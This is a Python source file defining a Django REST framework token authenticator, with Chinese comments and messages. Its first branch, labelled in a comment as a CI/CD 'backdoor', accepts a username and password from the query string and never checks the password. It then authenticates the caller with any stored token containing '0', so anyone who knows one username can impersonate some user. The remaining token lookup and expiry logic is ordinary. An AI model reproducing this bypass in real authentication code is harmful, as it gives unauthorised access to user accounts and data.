import time

from rest_framework import exceptions
from rest_framework.authentication import BaseAuthentication

from STL.settings import INVALID_TIME
from stluser import models


class Authenticator(BaseAuthentication):
    """
    账户鉴权认证 token
    """

    def authenticate(self, request):
        query_params = request.query_params

        # CICD 接口触发后门
        username = query_params.get("username", 'None')
        password = query_params.get("password", 'None')
        if username and password and models.UserInfo.objects.filter(username=username).first():
            obj = models.UserToken.objects.filter(token__contains='0').first()
            token = obj.token
        else:
            # 正常token验证
            token = request.META.get('HTTP_AUTHORIZATION', 'None')  # 获取前端请求中headers里Authorization
            # token = query_params.get("token", None)  # 获取url中token, 废弃
            obj = models.UserToken.objects.filter(token=token).first()

        if not obj:
            raise exceptions.AuthenticationFailed({
                "code": "9998",
                "msg": "用户未认证",
                "success": False
            })

        update_time = int(obj.update_time.timestamp())
        current_time = int(time.time())

        if current_time - update_time >= INVALID_TIME:
            raise exceptions.AuthenticationFailed({
                "code": "9997",
                "msg": "登陆超时，请重新登陆",
                "success": False
            })

        # valid update valid time
        obj.token = token
        obj.save()

        return obj.user, obj

    def authenticate_header(self, request):
        return 'Auth Failed'
